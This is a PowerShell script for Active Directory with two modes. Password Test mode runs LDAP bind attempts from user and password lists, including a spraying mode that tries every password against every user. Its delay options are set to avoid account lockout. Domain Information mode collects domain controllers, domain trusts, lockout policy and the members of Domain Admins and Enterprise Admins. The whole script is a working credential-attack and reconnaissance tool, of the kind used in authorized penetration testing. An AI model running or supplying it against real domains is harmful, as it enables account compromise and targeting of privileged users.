<#
.SYNOPSIS
Runs in one of two modes: Password Test or Domain Information.

.DESCRIPTION
======================================================================
MODE 1: PASSWORD TEST
======================================================================

Purpose
  Tests user and password combinations by performing LDAP bind attempts.

Options
  -UserFile <path>
      Text file containing one user name per line. Required.

  -PasswordFile <path>
      Text file containing passwords. Required.

  -DC <host-or-ip>
      Domain controller used for LDAP authentication. Required.

  -Domain <domain-name>
      Domain associated with the supplied user accounts. Required.

  -SharedDefault
      Tests every password against every user. Alias: -default.

  -PerUser
      Matches each user with the password on the corresponding line.
      Alias: -personal. This is the default behavior when -SharedDefault is
      not specified.

  -DelayPerRequest <seconds>
      Waits between individual LDAP bind attempts. The default is 0.

  -DelayPerLoop <minutes>
      In -SharedDefault mode, waits after completing one password against all
      users and before starting the next password. The default is 0.

Mode selection rules
  -SharedDefault and -PerUser cannot be used together.
  If neither option is supplied, the script uses PerUser behavior.

======================================================================
MODE 2: DOMAIN INFORMATION
======================================================================

Purpose
  Collects domain controllers, domain trusts, password policy, Domain Admins,
  and Enterprise Admins. It does not perform password tests.

Options
  -DomainInfo
      Selects Domain Information mode. Required for this mode.

  -Domain <domain-name>
      Domain to inventory. If omitted, USERDNSDOMAIN or USERDOMAIN is used.

  -DC <host-or-ip>
      Optional preferred domain controller and fallback value when automatic
      discovery cannot identify the primary controller.

.PARAMETER UserFile
[Password Test]
Path to a text file containing one user name per line. Empty lines are ignored.

.PARAMETER PasswordFile
[Password Test]
Path to a text file containing passwords. Passwords are processed from top to
bottom. Empty lines are ignored.

.PARAMETER DC
[Password Test]
Domain controller hostname or IP address used for LDAP bind attempts.

[Domain Information]
Optional preferred domain controller. It is also used as a fallback when the
primary domain controller cannot be identified automatically.

.PARAMETER Domain
[Password Test]
Domain name supplied with each LDAP credential, for example contoso.local.

[Domain Information]
Domain to inventory. When omitted, the script uses USERDNSDOMAIN or USERDOMAIN
from the current Windows session.

.PARAMETER SharedDefault
[Password Test]
Tests every password in PasswordFile against every user in UserFile. The shorter
alias -default may be used instead of -SharedDefault.

.PARAMETER PerUser
[Password Test]
Matches users and passwords by line number. UserFile and PasswordFile must have
the same number of non-empty lines. The shorter alias -personal may be used
instead of -PerUser.

.PARAMETER DelayPerRequest
[Password Test]
Delay in seconds between individual LDAP bind attempts. Values from 0 through
3600 are accepted in 0.1-second increments. The default is 0.

.PARAMETER DelayPerLoop
[Password Test - default mode only]
Delay in minutes after completing one password against all users and before
starting the next password. Values from 0 through 1440 are accepted. The
default is 0.

.PARAMETER DomainInfo
[Domain Information]
Selects Domain Information mode. No password tests are performed in this mode.

.EXAMPLE
.\test.ps1 -UserFile .\users.txt -PasswordFile .\passwords.txt `
    -DC dc01.contoso.local -Domain contoso.local -personal

Runs Password Test mode and pairs each user with the password on the same line.

.EXAMPLE
.\test.ps1 -UserFile .\users.txt -PasswordFile .\passwords.txt `
    -DC dc01.contoso.local -Domain contoso.local -default `
    -DelayPerRequest 1 -DelayPerLoop 5

Runs Password Test mode, testing each password against every user with delays
between requests and password loops.

.EXAMPLE
.\test.ps1 -Domain contoso.local -DC dc01.contoso.local -DomainInfo

Runs Domain Information mode for contoso.local. This does not perform LDAP
password tests.

.NOTES
Use Password Test mode only on systems and accounts for which testing has been
explicitly authorized. Keep this file encoded as UTF-8 with BOM for Windows
PowerShell 5.1 compatibility.
#>
[CmdletBinding(DefaultParameterSetName="Check")]
param(
    [Parameter(Mandatory=$false, ParameterSetName="Check")]
    [string]$UserFile,

    [Parameter(Mandatory=$false, ParameterSetName="Check")]
    [string]$PasswordFile,

    [Parameter(Mandatory=$false, ParameterSetName="Check")]
    [Parameter(Mandatory=$false, ParameterSetName="DomainInfo")]
    [string]$DC,

    [Parameter(Mandatory=$false, ParameterSetName="Check")]
    [Parameter(Mandatory=$false, ParameterSetName="DomainInfo")]
    [string]$Domain,

    [Parameter(Mandatory=$true, ParameterSetName="DomainInfo")]
    [switch]$DomainInfo,

    [Parameter(Mandatory=$false, ParameterSetName="Check")]
    [ValidateRange(0, 3600)]
    [double]$DelayPerRequest = 0,

    [Parameter(Mandatory=$false, ParameterSetName="Check")]
    [ValidateRange(0, 1440)]
    [double]$DelayPerLoop = 0,

    [Parameter(Mandatory=$false, ParameterSetName="Check")]
    [Alias("default")]
    [switch]$SharedDefault,

    [Parameter(Mandatory=$false, ParameterSetName="Check")]
    [Alias("personal")]
    [switch]$PerUser
)

Add-Type -AssemblyName System.DirectoryServices.Protocols
Add-Type -AssemblyName System.DirectoryServices

function Stop-Script {
    param(
        [Parameter(Mandatory=$true)]
        [string]$Message
    )

    Write-Host $Message -ForegroundColor Red
    exit 1
}

function Invoke-CmdText {
    param(
        [Parameter(Mandatory=$true)]
        [string]$Command
    )

    $output = & cmd.exe /c $Command 2>&1

    return @(
        $output |
            ForEach-Object { $_.ToString().Trim() } |
            Where-Object { -not [string]::IsNullOrWhiteSpace($_) }
    )
}

function Get-FirstMatch {
    param(
        [Parameter(Mandatory=$true)]
        [object[]]$Lines,

        [Parameter(Mandatory=$true)]
        [string[]]$Patterns
    )

    foreach ($line in @($Lines)) {
        if ([string]::IsNullOrWhiteSpace([string]$line)) {
            continue
        }

        $text = [string]$line

        foreach ($pattern in $Patterns) {
            if ($text -match $pattern) {
                return $Matches[1].Trim()
            }
        }
    }

    return $null
}

function Get-NetGroupMembers {
    param(
        [Parameter(Mandatory=$true)]
        [object[]]$Lines
    )

    $items = New-Object System.Collections.Generic.List[string]
    $capture = $false

    foreach ($line in @($Lines)) {
        $trimmed = [string]$line
        if ($trimmed -ne $null) {
            $trimmed = $trimmed.Trim()
        }

        # The dashed separator is stable across localized versions of net.exe.
        if (-not $capture) {
            if ($trimmed -match '^-{3,}$') {
                $capture = $true
            }
            continue
        }

        if ([string]::IsNullOrWhiteSpace($trimmed)) {
            continue
        }

        if ($trimmed -match '^(The command completed successfully\.|명령을 잘 실행했습니다\.|More help is available by typing NET HELPMSG.+|NET HELPMSG .+)$') {
            break
        }

        # net.exe may print multiple account names in fixed-width columns.
        foreach ($member in [regex]::Split($trimmed, '\s{2,}')) {
            $name = $member.Trim().TrimStart('*')
            if (-not [string]::IsNullOrWhiteSpace($name)) {
                $items.Add($name)
            }
        }
    }

    return @($items)
}

function ConvertFrom-DcListLines {
    param(
        [Parameter(Mandatory=$true)]
        [object[]]$Lines
    )

    foreach ($line in @($Lines)) {
        $text = ([string]$line).Trim()
        if ($text -notmatch '^(?:\\\\)?(?<Server>[A-Za-z0-9_.-]+)(?<Details>\s+(?:\[[^\]]+\]\s*)*(?:(?:Site|사이트)\s*:.*)?)$') {
            continue
        }

        $server = $Matches.Server
        $details = $Matches.Details.Trim()
        $site = if ($details -match '(?:Site|사이트)\s*:\s*(?<Site>.+)$') {
            $Matches.Site.Trim()
        }
        else {
            "N/A"
        }

        [PSCustomObject]@{
            Server  = $server
            Address = "N/A"
            Site    = $site
            Flags   = ($details -replace '(?:Site|사이트)\s*:.+$', '').Trim()
        }
    }
}

function Get-DirectoryServiceDomainControllers {
    param(
        [Parameter(Mandatory=$true)]
        [string]$DomainName
    )

    try {
        $context = [System.DirectoryServices.ActiveDirectory.DirectoryContext]::new(
            [System.DirectoryServices.ActiveDirectory.DirectoryContextType]::Domain,
            $DomainName
        )
        $domainObject = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($context)

        foreach ($controller in $domainObject.DomainControllers) {
            $address = "N/A"
            try {
                $resolvedAddresses = @(
                    [System.Net.Dns]::GetHostAddresses($controller.Name) |
                        ForEach-Object { $_.IPAddressToString }
                )
                if ($resolvedAddresses.Count -gt 0) {
                    $address = $resolvedAddresses -join ", "
                }
            }
            catch {
                # Keep the controller even when its address cannot be resolved.
            }

            [PSCustomObject]@{
                Server  = $controller.Name
                Address = $address
                Site    = if ($controller.SiteName) { $controller.SiteName } else { "N/A" }
                Flags   = "DirectoryServices"
            }
        }
    }
    catch {
        return @()
    }
}

function ConvertFrom-DomainTrustLines {
    param(
        [Parameter(Mandatory=$true)]
        [object[]]$Lines
    )

    foreach ($line in @($Lines)) {
        $text = ([string]$line).Trim()
        if ($text -notmatch '^(?<Index>\d+)\s*:\s*(?<Trust>.+)$') {
            continue
        }

        [PSCustomObject]@{
            Index = [int]$Matches.Index
            Trust = $Matches.Trust.Trim()
        }
    }
}

function Write-ReportSection {
    param(
        [Parameter(Mandatory=$true)]
        [string]$Title
    )

    Write-Host ""
    Write-Host ("=== {0} ===" -f $Title) -ForegroundColor Cyan
}

function Get-DomainInfo {
    $netbiosName = if ($env:USERDOMAIN) { $env:USERDOMAIN } else { "N/A" }
    $dnsName = if ($env:USERDNSDOMAIN) { $env:USERDNSDOMAIN } else { "N/A" }
    $targetDomain = if ($Domain) { $Domain } elseif ($env:USERDNSDOMAIN) { $env:USERDNSDOMAIN } elseif ($env:USERDOMAIN) { $env:USERDOMAIN } else { $null }

    $policyLines = Invoke-CmdText "net accounts /domain"
    $minLength = Get-FirstMatch -Lines $policyLines -Patterns @(
        '^(?:Minimum password length|Password minimum length|최소 암호 길이|암호 최소 길이)\s*[:：]\s*(\d+)\s*$'
    )
    $lockoutThreshold = Get-FirstMatch -Lines $policyLines -Patterns @(
        '^(?:Lockout threshold|계정 잠금 임계값|잠금 임계값|잠금 허용 임계값)\s*[:：]\s*(\d+)\s*$'
    )
    $lockoutDuration = Get-FirstMatch -Lines $policyLines -Patterns @(
        '^(?:Lockout duration(?: \(minutes\))?|계정 잠금 기간(?: \(분\))?|잠금 기간(?: \(분\))?)\s*[:：]\s*([0-9]+|Never|없음|무제한|영구적)\s*$'
    )

    if ($null -eq $minLength) {
        $minLength = "N/A"
    }

    if ($null -eq $lockoutThreshold) {
        $lockoutThreshold = "N/A"
    }

    if ($null -eq $lockoutDuration) {
        $lockoutDuration = "N/A"
    }
    elseif ($lockoutDuration -match '^\d+$') {
        $lockoutDuration = "$lockoutDuration minutes"
    }
    elseif ($lockoutDuration -in @("없음", "무제한", "영구적")) {
        $lockoutDuration = "Never"
    }
    $dcName = "N/A"
    $dcAddress = "N/A"
    $dcList = @()
    $trustList = @()
    $domainAdmins = @()
    $enterpriseAdmins = @()

    if ($targetDomain) {
        $dcGetLines = Invoke-CmdText ("nltest /dsgetdc:{0}" -f $targetDomain)
        $dcName = Get-FirstMatch -Lines $dcGetLines -Patterns @(
            '^\s*(?:DC|Domain Controller|도메인 컨트롤러)\s*[:：]\s*\\*([^\s]+)'
        )
        $dcAddress = Get-FirstMatch -Lines $dcGetLines -Patterns @(
            '^\s*(?:Address|주소)\s*[:：]\s*\\*([^\s]+)'
        )

        $dcList = @(Get-DirectoryServiceDomainControllers -DomainName $targetDomain)

        # nltest is retained as a fallback and may discover a controller that
        # DirectoryServices did not return in the current logon context.
        $dcListLines = Invoke-CmdText ("nltest /dclist:{0}" -f $targetDomain)
        $nltestDcList = @(ConvertFrom-DcListLines -Lines $dcListLines)
        foreach ($controller in $nltestDcList) {
            if (-not ($dcList | Where-Object { $_.Server -ieq $controller.Server })) {
                $dcList += $controller
            }
        }

        $dcList = @($dcList | Sort-Object Server -Unique)

        if ((-not $dcName -or $dcName -eq "N/A") -and $DC) {
            $dcName = $DC.TrimStart('\')
        }
        elseif ((-not $dcName -or $dcName -eq "N/A") -and $dcList.Count -gt 0) {
            $dcName = $dcList[0].Server
        }

        if ((!$dcAddress -or $dcAddress -eq "N/A") -and $dcName) {
            $matchedController = $dcList | Where-Object { $_.Server -ieq $dcName } | Select-Object -First 1
            if ($matchedController -and $matchedController.Address -ne "N/A") {
                $dcAddress = $matchedController.Address
            }
        }
    }

    $trustLines = Invoke-CmdText "nltest /domain_trusts"
    $trustList = @(ConvertFrom-DomainTrustLines -Lines $trustLines)

    $domainAdmins = Get-NetGroupMembers -Lines (Invoke-CmdText 'net group "Domain Admins" /domain')
    $enterpriseAdmins = Get-NetGroupMembers -Lines (Invoke-CmdText 'net group "Enterprise Admins" /domain')

    Write-ReportSection "Domain Inventory"
    [PSCustomObject]@{
        "Target Domain" = if ($targetDomain) { $targetDomain } else { "N/A" }
        "NetBIOS Name"  = $netbiosName
        "DNS Name"      = $dnsName
        "Primary DC"    = if ($dcName) { $dcName } else { "N/A" }
        "DC Address"    = if ($dcAddress) { $dcAddress } else { "N/A" }
    } | Format-List | Out-Host

    Write-Host "Domain Controllers" -ForegroundColor Yellow
    if ($dcList.Count -gt 0) {
        $dcList | Format-Table -AutoSize | Out-Host
    }
    else {
        Write-Host "  N/A"
    }

    Write-Host "Domain Trusts" -ForegroundColor Yellow
    if ($trustList.Count -gt 0) {
        foreach ($trust in @($trustList | Sort-Object Trust -Unique)) {
            Write-Host ("  - {0}" -f $trust.Trust)
        }
    }
    else {
        Write-Host "  N/A"
    }

    Write-ReportSection "Password Policy"
    [PSCustomObject]@{
        "Minimum Password Length" = $minLength
        "Lockout Threshold"       = $lockoutThreshold
        "Lockout Duration"        = $lockoutDuration
    } | Format-List | Out-Host

    Write-ReportSection "Administrative Groups"
    Write-Host "Domain Admins" -ForegroundColor Yellow
    if ($domainAdmins.Count -gt 0) {
        foreach ($member in @($domainAdmins | Sort-Object -Unique)) {
            Write-Host ("  - {0}" -f $member)
        }
    }
    else {
        Write-Host "  N/A"
    }

    Write-Host "Enterprise Admins" -ForegroundColor Yellow
    if ($enterpriseAdmins.Count -gt 0) {
        foreach ($member in @($enterpriseAdmins | Sort-Object -Unique)) {
            Write-Host ("  - {0}" -f $member)
        }
    }
    else {
        Write-Host "  N/A"
    }
}

if ($PSCmdlet.ParameterSetName -eq "DomainInfo") {
    Get-DomainInfo
    exit 0
}

if (-not $UserFile -or -not $PasswordFile) {
    Stop-Script "UserFile and PasswordFile are required unless -DomainInfo is used."
}

$users = @(Get-Content $UserFile | ForEach-Object { $_.Trim() } | Where-Object { -not [string]::IsNullOrWhiteSpace($_) })
# Passwords must be read verbatim except for trailing CR from Windows line endings.
$passwords = @(Get-Content $PasswordFile | ForEach-Object { $_.TrimEnd("`r") } | Where-Object { -not [string]::IsNullOrWhiteSpace($_) })

if ($SharedDefault -and $PerUser) {
    Stop-Script "-SharedDefault and -personal cannot be used together."
}

if (($DelayPerRequest * 10) % 1 -ne 0) {
    Stop-Script "DelayPerRequest must be specified in 0.1 second increments."
}

$delayPerLoopSeconds = [int]($DelayPerLoop * 60)

$mode = if ($SharedDefault) { "SharedDefault" } else { "Personal" }

if ($mode -eq "SharedDefault") {
    if ($passwords.Count -lt 1) {
        Stop-Script "Shared default mode requires at least one password in PasswordFile."
    }
}
elseif ($users.Count -ne $passwords.Count) {
    Stop-Script "Personal mode requires the same number of users ($($users.Count)) and passwords ($($passwords.Count)). Use -default to apply one or more shared passwords to all users."
}

$foundCount = 0

if ($mode -eq "SharedDefault") {
    for ($p = 0; $p -lt $passwords.Count; $p++) {
        $password = $passwords[$p]

        for ($i = 0; $i -lt $users.Count; $i++) {
            $user = $users[$i]

            $fullUser = "$Domain\$user"

            $conn = New-Object System.DirectoryServices.Protocols.LdapConnection($DC)
            $conn.AuthType = [System.DirectoryServices.Protocols.AuthType]::Negotiate

            try {
                $netCred = New-Object System.Net.NetworkCredential(
                    $user,
                    $password,
                    $Domain
                )

                # Attempt exactly one bind per user/password pair.
                $conn.Bind($netCred)

                $foundCount++
                Write-Host ("[+] {0} : {1}" -f $fullUser, $password)
            }
            catch {
                continue
            }
            finally {
                $conn.Dispose()
            }

            if ($DelayPerRequest -gt 0) {
                $isLastPassword = ($p -eq ($passwords.Count - 1))
                $isLastUser = ($i -eq ($users.Count - 1))

                if (-not ($isLastPassword -and $isLastUser)) {
                    Start-Sleep -Milliseconds ([int]($DelayPerRequest * 1000))
                }
            }
        }

        if ($delayPerLoopSeconds -gt 0 -and $p -lt ($passwords.Count - 1)) {
            Start-Sleep -Seconds $delayPerLoopSeconds
        }
    }
}
else {
    for ($i = 0; $i -lt $users.Count; $i++) {
        $user = $users[$i]
        $password = $passwords[$i]

        $fullUser = "$Domain\$user"

        $conn = New-Object System.DirectoryServices.Protocols.LdapConnection($DC)
        $conn.AuthType = [System.DirectoryServices.Protocols.AuthType]::Negotiate

        try {
            $netCred = New-Object System.Net.NetworkCredential(
                $user,
                $password,
                $Domain
            )

            # Attempt exactly one bind per user/password pair.
            $conn.Bind($netCred)

            $foundCount++
            Write-Host ("[+] {0} : {1}" -f $fullUser, $password)
        }
        catch {
            continue
        }
        finally {
            $conn.Dispose()
        }

        if ($DelayPerRequest -gt 0 -and $i -lt ($users.Count - 1)) {
            Start-Sleep -Milliseconds ([int]($DelayPerRequest * 1000))
        }
    }
}

if ($foundCount -gt 0) {
    Write-Host ""
    Write-Host ("Total matches: {0}" -f $foundCount)
}
else {
    Write-Host "No accounts were found using the default password."
}
